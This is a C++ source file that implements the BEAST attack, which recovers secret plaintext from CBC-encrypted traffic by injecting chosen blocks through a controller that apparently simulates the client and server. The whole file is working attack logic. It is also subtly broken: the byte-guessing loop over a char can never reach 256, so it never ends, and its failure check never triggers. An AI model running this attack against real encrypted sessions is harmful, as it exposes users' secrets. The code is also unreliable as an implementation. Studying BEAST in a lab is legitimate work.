#include "beast.h"
#include "../common/utils.h"

BeastDecrypter::BeastDecrypter(int _max_len, int _block_size, T_Controller* _ctrl):max_len(_max_len), 
    block_size(_block_size), ctrl(_ctrl)
{
    buf = new char[max_len];
    ori_recv = new char[max_len];
    first_r = new char[max_len];
    last_recv = new char[max_len];
}

int BeastDecrypter::send_malicious_message(const char* buf, int len, char* recv){
    //TODO: the controller forces the sender to send the message to server
    // and give the encrypted message back to controller
    ctrl->send_client_instruction(T_Instr::ENCRYPTED_MESSAGE_TO_PEER, buf, len);
    ctrl->send_server_instruction(T_Instr::RECEIVED_PLAIN_TO_ME, nullptr, 0);
    int recv_len = ctrl->recv_server_message(recv);
    return recv_len;
}

int BeastDecrypter::xor_block(const char* a, const char* b, const char* c, int len_a, int len_b, int len_c, char* buf){
    int min_len = min(min(len_a, len_b), len_c);
    // if (min_len > max_len) exit(-1); // Assertion Failed for the storage
    for (int i=0; i<min_len; i++){
        buf[i] = a[i] ^ b[i] ^ c[i];
    }
    return min_len;
}

bool BeastDecrypter::run(const std::string secret, const std::string known_head) {
    puts("We have now started the beast decryption");
     // padding is the length we need to add to i_know to create a length of 15 bytes (block size- 1)
    int padding = block_size - 1 - known_head.size() % block_size;
    char* p_guess = new char[block_size + 5];
    for (int i=0; i<padding; i++)
        p_guess[i] = 'a';
    strcpy(p_guess + padding, known_head.c_str());
    p_guess[ block_size + 1] = '\0';
    for(int i=known_head.size(); i < secret.size(); i++){
        std::string s;
        if (padding < 0)   
            s = secret.substr(-padding);
        else s = secret;

        for (char ch=0; ch<256; ch++) {

            std::string pad;
            if (padding > 0) {
                pad = std::string(padding, 'a');
            } else pad = "";
            pad = pad + s;

            int len_a = send_malicious_message( pad.c_str(), block_size, first_r);
            // hexify(first_r, len_a);
            int len_b = send_malicious_message( pad.c_str(), block_size, ori_recv);
            // hexify(ori_recv, len_b);
            char* vector_init = ori_recv + (len_b - block_size);
            p_guess[block_size - 1] = ch;
            int len = xor_block(p_guess, first_r , vector_init, block_size, block_size, block_size, buf); 
            
            int len_c = send_malicious_message(buf, block_size, last_recv);
            // hexify(last_recv, len_c);
            if (check(ori_recv, last_recv, block_size)){
                padding--;
                for (int j=1; j<block_size; j++)
                    p_guess[j-1] = p_guess[j];
                break;
            }
            else if (ch == 255){
                printf("Cannot find answer at %d bit\n", i);
                return false;
            }
        }
    }
    return true;

}